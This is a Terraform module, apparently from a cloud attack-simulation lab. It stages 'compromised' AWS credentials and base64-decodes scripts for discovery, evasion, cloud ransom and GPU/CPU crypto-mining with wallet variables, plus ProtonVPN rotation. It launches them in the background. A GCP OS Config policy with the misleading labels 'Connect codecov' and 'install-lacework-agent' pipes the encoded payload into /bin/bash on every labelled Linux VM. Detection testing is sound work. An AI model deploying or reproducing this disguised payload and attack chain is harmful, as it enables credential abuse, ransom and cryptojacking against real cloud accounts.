locals {
    attack_dir = "/cloud-tunnel"
    aws_creds = join("\n", [ for u,k in var.compromised_credentials: "echo '${k.rendered}' > ${local.attack_dir}/.env-aws-${u}" ])
    payload = <<-EOT
    LOGFILE=/tmp/attacker_exec_docker_compromised_keys_attacker.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    
    if docker ps | grep aws-cli || docker ps | grep terraform; then 
        log "Attempt to start new session skipped - aws-cli or terraform docker is running..."; 
    else
        truncate -s 0 $LOGFILE
        log "Starting new session no existing session detected..."
        rm -rf ${local.attack_dir}
        mkdir -p ${local.attack_dir} ${local.attack_dir}/aws-cli/scripts ${local.attack_dir}/terraform/scripts/cloudcrypto ${local.attack_dir}/terraform/scripts/hostcrypto ${local.attack_dir}/protonvpn
        cd ${local.attack_dir}
        ${local.aws_creds}
        echo '${base64encode(local.start)}' | base64 -d > /${local.attack_dir}/start.sh
        echo '${base64encode(local.auto-free)}' | base64 -d > /${local.attack_dir}/auto-free.sh
        echo '${base64encode(local.auto-paid)}' | base64 -d > /${local.attack_dir}/auto-paid.sh
        echo '${base64encode(local.protonvpn)}' | base64 -d > /${local.attack_dir}/.env-protonvpn
        echo '${base64encode(local.protonvpn-baseline)}' | base64 -d > /${local.attack_dir}/.env-protonvpn-baseline
        echo '${base64encode(local.baseline)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/baseline.sh
        echo '${base64encode(local.discovery)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/discovery.sh
        echo '${base64encode(local.evasion)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/evasion.sh
        echo '${base64encode(local.cloudransom)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/cloudransom.sh
        echo '${base64encode(local.cloudcrypto)}' | base64 -d > /${local.attack_dir}/terraform/scripts/cloudcrypto/main.tf
        echo '${base64encode(local.hostcrypto)}' | base64 -d > /${local.attack_dir}/terraform/scripts/hostcrypto/main.tf
        for i in $(echo "AU CR IS JP LV NL NZ SG SK US US-FREE#34 NL-FREE#148 JP-FREE#3"); do cp .env-protonvpn .env-protonvpn-$i; sed -i "s/RANDOM/$i/" .env-protonvpn-$i; done
        while ! which docker > /dev/null || ! docker ps > /dev/null; do
            log "docker not found or not ready - waiting"
            sleep 120
        done
        log "Starting simulation..."
        if [ "${var.protonvpn_tier}" == "0" ]; then
        log "Protonvpn tier is free tier: ${var.protonvpn_tier}"
        log "Starting auto-free.sh as background job..."
        bash auto-free.sh & >> $LOGFILE 2>&1
        else
        log "Protonvpn tier is paid tier: ${var.protonvpn_tier}"
        log "Starting auto-paid.sh as background job..."
        bash auto-paid.sh&  >> $LOGFILE 2>&1
        fi;
    fi;
    EOT
    base64_payload = base64encode(local.payload)

    
    protonvpn       = templatefile(
                                "${path.module}/resources/protonvpn.env.tpl", 
                                {
                                    protonvpn_user = var.protonvpn_user
                                    protonvpn_password = var.protonvpn_password
                                    protonvpn_server = var.protonvpn_server
                                    protonvpn_tier = tostring(var.protonvpn_tier)
                                    protonvpn_protocol = var.protonvpn_protocol
                                }
                            )
    protonvpn-baseline  = templatefile(
                                "${path.module}/resources/protonvpn.env.tpl", 
                                {
                                    protonvpn_user = var.protonvpn_user
                                    protonvpn_password = var.protonvpn_password
                                    protonvpn_server = "US"
                                    protonvpn_tier = tostring(var.protonvpn_tier)
                                    protonvpn_protocol = var.protonvpn_protocol
                                }
                            )
    auto-free   = templatefile(
                                "${path.module}/resources/auto-free.sh.tpl",
                                {
                                    
                                }
                            )
    auto-paid   = templatefile(
                                "${path.module}/resources/auto-paid.sh.tpl",
                                {
                                    
                                }
                            )
    baseline    = templatefile(
                                "${path.module}/resources/baseline.sh.tpl",
                                {
                                    
                                }
                            )
    discovery   = templatefile(
                                "${path.module}/resources/discovery.sh.tpl",
                                {
                                    
                                }
                            )
    evasion     = templatefile(
                                "${path.module}/resources/evasion.sh.tpl",
                                {
                                    
                                }
                            )
    cloudransom = templatefile(
                                "${path.module}/resources/cloudransom.sh.tpl",
                                {
                                    
                                }
                            )
    cloudcrypto = templatefile(
                                "${path.module}/resources/cloudcrypto.tf.tpl",
                                {
                                    name = "crypto-gpu-miner-${var.environment}-${var.deployment}"
                                    instances = 12
                                    wallet = var.ethermine_wallet
                                    region = var.region
                                }
                            )
    hostcrypto  = templatefile(
                                "${path.module}/resources/hostcrypto.tf.tpl",
                                {
                                    name = "crypto-cpu-miner-${var.environment}-${var.deployment}"
                                    region = var.region
                                    instances = 1
                                    minergate_user = var.minergate_user
                                }
                            )
    start       = templatefile(
                                "${path.module}/resources/start.sh.tpl",
                                {
                                    
                                }
                            )
}

resource "google_os_config_os_policy_assignment" "install-lacework-agent" {

  project     = var.gcp_project_id
  location    = data.google_compute_zones.available.names[0]
  
  name        = "osconfig-connect-codecov-${var.environment}-${var.deployment}"
  description = "Connect codecov"
  skip_await_rollout = true
  
  instance_filter {
    all = false

    inclusion_labels {
      labels = var.label
    }

    inventories {
      os_short_name = "ubuntu"
    }

    inventories {
      os_short_name = "debian"
    }

  }

  os_policies {
    id   = "osconfig-connect-codecov-${var.environment}-${var.deployment}"
    mode = "ENFORCEMENT"

    resource_groups {
      resources {
        id = "run"
        exec {
          validate {
            interpreter      = "SHELL"
            output_file_path = "$HOME/os-policy-tf.out"
            script           = "if false; then exit 100; else exit 101; fi"
          }
          enforce {
            interpreter      = "SHELL"
            output_file_path = "$HOME/os-policy-tf.out"
            script           = "echo '${local.base64_payload}' | tee /tmp/payload_${basename(abspath(path.module))} | base64 -d | /bin/bash - && exit 100"
          }
        }
      }
    }
  }

  rollout {
    disruption_budget {
      percent = 100
    }
    min_wait_duration = "600s"
  }
}